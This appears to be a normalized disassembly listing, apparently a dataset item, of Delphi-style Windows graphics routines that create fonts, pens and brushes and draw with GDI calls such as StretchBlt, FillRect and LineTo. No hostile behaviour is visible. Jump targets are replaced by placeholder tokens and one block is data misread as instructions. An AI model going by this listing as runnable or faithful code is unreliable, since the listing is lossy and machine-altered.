pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4235d0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov edx [ eax ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
mov eax edx
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov [ eax ] edx
sub_423770
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4235c4
xor eax eax
push ebp
push sub_4237d9
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4235dc
mov esi eax
mov [ ebx + 0x10 ] esi
cmp edi esi
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4236c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4237e0
mov eax [ ebp - 0x4 ]
call sub_4235d0
retn
mov eax ebx
mov si 0xfffd
call sub_403324
sub_4237e8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4235c4
xor eax eax
push ebp
push sub_423844
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ esi + 0x10 ]
cmp edi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42384b
mov eax [ ebp - 0x4 ]
call sub_4235d0
retn
inc [ edi + 0x4 ]
mov [ esi + 0x10 ] edi
mov eax esi
mov si 0xfffd
call sub_403324
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4236c0
sub_423854
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4235c4
xor edx edx
push ebp
push sub_4238b3
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4238ba
mov eax [ ebp - 0x4 ]
call sub_4235d0
retn
mov esi ebx
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
cmp [ esi + 0x14 ] 0x0
jge r-xdata
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x8 ] eax
sub_4238c0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_418ac4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42395d
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_418700
mov ebx eax
mov eax ebx
call sub_424f1c
inc [ ebp - 0x4 ]
mov eax ebx
call sub_4252a0
mov eax [ rw-data ]
call sub_423854
mov eax [ rw-data ]
call sub_423854
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423964
mov ebx [ ebp - 0x4 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
call sub_418b28
retn
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_418700
call sub_425154
inc esi
dec ebx
jne r-xdata
sub_423fb3
dec [ ebx ]
add [ eax ] al
add [ edi + 0x45 ] cl
dec ebp
pop edi
inc ebx
dec eax
inc ecx
push edx
push ebx
inc ebp
push esp
add [ edx + 0x11 ] ch
mov ecx rw-data
call sub_418024
retn
sub_423fe4
push ebx
push esi
push edi
add esp 0xffffffa0
mov ebx edx
mov esi eax
push esi
mov edi ebx
mov esi rw-data
mov ecx 0xb
[ edi ] [ esi ]
pop esi
test esi esi
je r-xdata
add esp 0x60
pop edi
pop esi
pop ebx
retn
push esp
push 0x3c
push esi
call GetObjectA
test eax eax
je r-xdata
mov eax [ esp ]
mov [ ebx + 0x4 ] eax
cmp [ esp + 0x10 ] 0x2bc
jl r-xdata
cmp [ esp + 0x14 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x1
cmp [ esp + 0x15 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x2
cmp [ esp + 0x16 ] 0x1
jne r-xdata
or [ ebx + 0x9 ] 0x4
mov al [ esp + 0x17 ]
mov [ ebx + 0xa ] al
lea eax [ esp + 0x3c ]
lea edx [ esp + 0x1c ]
mov ecx 0x20
call sub_402c34
lea edx [ esp + 0x3c ]
lea eax [ ebx + 0xb ]
mov cl 0x1f
call sub_402a24
mov al [ esp + 0x1b ]
and al 0xf
dec al
je r-xdata
or [ ebx + 0x9 ] 0x8
mov [ ebx + 0x8 ] 0x2
jmp r-xdata
dec al
jne r-xdata
mov [ ebx ] esi
mov [ ebx + 0x8 ] 0x0
mov [ ebx + 0x8 ] 0x1
jmp r-xdata
sub_424098
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx rw-data
mov eax [ rw-data ]
call sub_4235dc
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0xff000008
mov eax [ rw-data ]
mov [ esi + 0x1c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax esi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_4240ec
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_4236c0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_424130
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_418d14
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_423df0
xor eax eax
push ebp
push sub_4241eb
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_423df0
xor eax eax
push ebp
push sub_4241ce
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4237e8
mov edx [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_42426c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
cmp eax [ ebx + 0x1c ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4241d5
mov eax [ ebp - 0x8 ]
call sub_423e00
retn
mov eax ebx
call sub_4244f0
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_42450c
sub_42421c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_423df0
xor eax eax
push ebp
push sub_424261
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_423770
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424268
mov eax [ ebp - 0x4 ]
call sub_423e00
retn
sub_424280
push ebp
mov ebp esp
add esp 0xffffffb4
push ebx
xor edx edx
mov [ ebp - 0x4c ] edx
mov [ ebp - 0x48 ] edx
mov [ ebp - 0x44 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_424409
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424410
lea eax [ ebp - 0x4c ]
mov edx 0x3
call sub_403edc
retn
mov eax [ rw-data ]
call sub_4235c4
xor eax eax
push ebp
push sub_4243e1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_4235d0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x1
je r-xdata
mov [ ebp - 0x30 ] 0x190
mov [ ebp - 0x30 ] 0x2bc
jmp r-xdata
lea eax [ ebp - 0x4c ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_40411c
mov edx [ ebp - 0x4c ]
lea eax [ ebp - 0x24 ]
call sub_408904
lea eax [ ebp - 0x48 ]
mov edx rw-data
call sub_40411c
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x24 ]
call sub_408904
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x2
setne al
mov [ ebp - 0x2c ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x4
setne al
mov [ ebp - 0x2b ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x8
setne al
mov [ ebp - 0x2a ] al
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a ]
mov [ ebp - 0x29 ] al
lea eax [ ebp - 0x44 ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_40411c
mov eax [ ebp - 0x44 ]
mov edx r-xdata
call sub_407f38
test eax eax
jne r-xdata
mov [ ebp - 0x25 ] 0x2
jmp r-xdata
dec al
je r-xdata
mov [ ebp - 0x26 ] 0x0
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x27 ] 0x0
mov eax ebx
call sub_424564
dec al
je r-xdata
lea eax [ ebp - 0x40 ]
push eax
call CreateFontIndirectA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x25 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x25 ] 0x0
sub_424428
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax esi
call sub_423fe4
mov edx esp
mov eax ebx
call sub_42421c
add esp 0x2c
pop esi
pop ebx
retn
sub_424454
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_424204
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_42421c
add esp 0x2c
pop esi
pop ebx
retn
sub_424494
push ebx
push esi
add esp 0xfffffed4
mov esi edx
mov ebx eax
test esi esi
je r-xdata
add esp 0x12c
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_424204
lea eax [ esp + 0xb ]
xor ecx ecx
mov edx 0x20
call sub_402b34
lea eax [ esp + 0x2c ]
mov edx esi
mov ecx 0xff
call sub_404154
lea edx [ esp + 0x2c ]
lea eax [ esp + 0xb ]
mov cl 0x1f
call sub_402a24
mov edx esp
mov eax ebx
call sub_42421c
sub_42450c
push ebx
push esi
mov esi edx
mov ebx eax
push 0x48
mov eax [ ebx + 0x1c ]
push eax
push esi
call MulDiv
mov edx eax
neg edx
mov eax ebx
call sub_424454
pop esi
pop ebx
retn
sub_424538
push ebx
add esp 0xffffffd0
mov [ esp ] dl
mov ebx eax
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_424204
mov al [ esp ]
mov [ esp + 0xd ] al
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_42421c
add esp 0x30
pop ebx
retn
sub_42456c
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_424204
mov [ esp + 0x8 ] bl
mov edx esp
mov eax esi
call sub_42421c
add esp 0x2c
pop esi
pop ebx
retn
sub_42459c
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_424204
mov [ esp + 0xa ] bl
mov edx esp
mov eax esi
call sub_42421c
add esp 0x2c
pop esi
pop ebx
retn
sub_4245c4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_4235dc
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0x4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax esi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_424608
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_4236c0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_424630
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_418d14
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_423df0
xor eax eax
push ebp
push sub_4246cf
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_423df0
xor eax eax
push ebp
push sub_4246b2
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4237e8
mov dl [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_424818
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4246b9
mov eax [ ebp - 0x8 ]
call sub_423e00
retn
sub_4246e8
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_424700
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_423df0
xor eax eax
push ebp
push sub_424745
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_423770
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42474c
mov eax [ ebp - 0x4 ]
call sub_423e00
retn
sub_424758
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_4246e8
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_424700
add esp 0x10
pop esi
pop ebx
retn
sub_424780
push ebp
mov ebp esp
add esp 0xffffffec
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_4235c4
xor eax eax
push ebp
push sub_424806
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_4235d0
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1c ]
movzx eax [ eax * 2 + rw-data ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_423dac
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push eax
call CreatePenIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
sub_424834
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_4246e8
mov [ esp + 0xc ] bl
mov edx esp
mov eax esi
call sub_424700
add esp 0x10
pop esi
pop ebx
retn
sub_424864
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_4246e8
mov [ esp + 0x8 ] esi
mov edx esp
mov eax ebx
call sub_424700
sub_424890
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_4235dc
mov [ esi + 0x10 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax esi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_4248d0
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_4236c0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_4248f8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_418d14
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_423df0
xor eax eax
push ebp
push sub_424988
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_423df0
xor eax eax
push ebp
push sub_42496b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4237e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424972
mov eax [ ebp - 0x8 ]
call sub_423e00
retn
sub_4249a0
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
xor eax eax
mov [ edx + 0x8 ] eax
pop edi
pop esi
retn
sub_4249bc
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_423df0
xor eax eax
push ebp
push sub_424a01
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_423770
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424a08
mov eax [ ebp - 0x4 ]
call sub_423e00
retn
sub_424a0c
push esi
push edi
add esp 0xfffffff0
mov esi rw-data
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp + 0x8 ] edx
mov edx esp
call sub_4249bc
add esp 0x10
pop edi
pop esi
retn
sub_424a38
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_4249a0
mov [ esp + 0x4 ] esi
cmp [ esp + 0xc ] 0x1
jne r-xdata
mov edx esp
mov eax ebx
call sub_4249bc
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0xc ] 0x0
sub_424a6c
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_4235c4
xor edx edx
push ebp
push sub_424b39
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_4235d0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1c ]
mov edx eax
sub dl 0x1
jb r-xdata
mov [ ebp - 0x10 ] 0x3
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_423dac
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x10 ]
push eax
call CreateBrushIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x10 ] 0x2
and eax 0x7f
sub eax 0x2
mov [ ebp - 0x8 ] eax
sub_424b54
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_4249a0
mov eax ebx
mov [ esp + 0xc ] al
cmp al 0x1
jne r-xdata
mov edx esp
mov eax esi
call sub_4249bc
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0xffffff
sub_424b88
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
push esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4245c4
mov ecx eax
xor edx edx
mov eax edi
call sub_41906c
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_424bd0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
push esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_424890
mov ecx eax
xor edx edx
mov eax edi
call sub_41906c
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_424c18
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4030f8
lea eax [ edi + 0x38 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_424098
mov esi eax
mov [ edi + 0xc ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_4254c8
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4245c4
mov esi eax
mov [ edi + 0x10 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_4254e8
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424890
mov esi eax
mov [ edi + 0x14 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_425508
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov [ edi + 0x20 ] 0xcc0020
mov al [ r-xdata ]
mov [ edi + 0x8 ] al
mov edx edi
mov eax [ rw-data ]
call sub_418a3c
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_424cdc
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_418ad8
xor edx edx
mov eax esi
call sub_425300
mov eax [ esi + 0xc ]
call sub_403128
mov eax [ esi + 0x10 ]
call sub_403128
mov eax [ esi + 0x14 ]
call sub_403128
lea eax [ esi + 0x38 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418ce8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_424d38
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_425354
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_425354
mov edx [ ebx + 0x20 ]
push edx
mov edx [ edi + 0xc ]
sub edx [ edi + 0x4 ]
push edx
mov edx [ edi + 0x8 ]
sub edx [ edi ]
push edx
mov edx [ edi + 0x4 ]
push edx
mov edx [ edi ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ esi + 0xc ]
sub edx [ esi + 0x4 ]
push edx
mov edx [ esi + 0x8 ]
mov eax [ esi ]
sub edx eax
push edx
mov edx [ esi + 0x4 ]
push edx
push eax
mov eax [ ebx + 0x4 ]
push eax
call StretchBlt
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_424dc0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_425354
mov eax [ ebx + 0x14 ]
call sub_424a30
call sub_423dac
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_423dac
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
add eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
add ecx edi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_4170c4
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_424e6c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_425354
mov eax [ ebx + 0x14 ]
call sub_424a6c
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FillRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_424ea8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_425354
mov eax [ ebx + 0x14 ]
call sub_424a6c
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FrameRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_424ee4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_425354
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call LineTo
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_424f44
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_425354
push 0x0
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call MoveToEx
pop edi
pop esi
pop ebx
retn
sub_424f70
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_425354
inc edi
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call Polygon
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_424fa8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
